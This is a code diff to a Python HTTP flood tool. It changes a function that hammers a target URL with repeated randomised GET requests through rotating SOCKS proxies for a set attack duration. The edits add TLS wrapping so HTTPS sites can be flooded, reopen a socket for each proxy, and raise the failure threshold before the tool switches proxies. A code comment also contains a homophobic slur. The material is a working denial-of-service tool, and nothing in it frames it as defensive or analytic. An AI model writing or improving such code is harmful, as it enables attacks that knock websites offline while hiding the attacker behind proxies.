@@ -1,5 +1,5 @@
 # import modules
-import socket, socks, requests, time, json
+import socket, socks, requests, time, json, ssl
 from random import randint, choice, uniform, shuffle
 
 # import depencies
@@ -272,27 +272,32 @@ def http_proxy(worker_id, proto, target_url, attack_duration, useragent, referer
     port = 443 if target_url.startswith('https://') else 80
 
     stoptime = time.time() + attack_duration
-    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     while time.time() < stoptime and Core.attackrunning:
         try:
-            errcount = 0
+            s = socks.socksocket()
+            s.settimeout(3)
+
+            if port == 443: # ssl
+                ctx = ssl.SSLContext()
+                s = ctx.wrap_socket(s,server_hostname=host)
+
             proxip, proxport = choice(Core.proxy_pool).split(':')
 
             try: s.set_proxy(proto, proxip, int(proxport))
             except: Core.proxy_pool.delete(f'{proxip}:{proxport}'); continue
 
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-
             try: s.connect( (host, int(port) ))
-            except: continue
+            except: continue # skip
 
             # build packet
             headers = ''.join([f'{key}: {value}\r\n' for key,value in buildheaders(target_url, useragent, referer).items()])
             packet = f'GET /{buildblock("/")} HTTP/1.1\r\n{headers}\r\n'.encode()
 
+            errcount = 0
             while Core.attackrunning: # run while we should attack
-                if errcount >= 20: # 20 failed requests, gay
+                if errcount >= 40: # 40 failed requests, gay
                     break # switch to new proxy
+
                 try: 
                     s.send( packet )
                     Core.infodict[worker_id]['req_sent'] += 1
